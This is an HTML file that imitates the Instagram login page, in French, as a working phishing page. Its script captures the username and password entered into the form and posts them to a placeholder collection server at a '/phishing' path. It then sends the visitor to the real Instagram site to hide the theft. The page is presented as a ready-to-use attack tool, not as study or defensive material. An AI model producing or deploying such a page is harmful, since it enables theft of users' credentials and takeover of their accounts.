<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 175px;
        }
        .input-field {
            margin-bottom: 20px;
        }
        .input-field input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #0084d4;
        }
        .separator {
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
        }
        .separator hr {
            width: 100%;
            border: 0;
            border-top: 1px solid #dbdbdb;
            margin: 0;
        }
        .separator span {
            background-color: #fff;
            padding: 0 10px;
            position: relative;
            top: -10px;
        }
        .forgot-password {
            text-align: center;
            margin-top: 20px;
            color: #00376b;
        }
        .forgot-password a {
            text-decoration: none;
            color: #00376b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
        </div>
        <div class="input-field">
            <input type="text" id="username" placeholder="Nom d'utilisateur, adresse e-mail ou numéro de téléphone" required>
        </div>
        <div class="input-field">
            <input type="password" id="password" placeholder="Mot de passe" required>
        </div>
        <button class="login-btn" onclick="submitForm()">Se connecter</button>
        <div class="separator">
            <hr>
            <span>OU</span>
            <hr>
        </div>
        <div class="forgot-password">
            <a href="#">Mot de passe oublié ?</a>
        </div>
    </div>

    <script>
        function submitForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Envoyer les données à votre serveur
            fetch('https://votre-serveur.com/phishing', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                // Rediriger vers la page d'accueil d'Instagram
                window.location.href = 'https://www.instagram.com/';
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
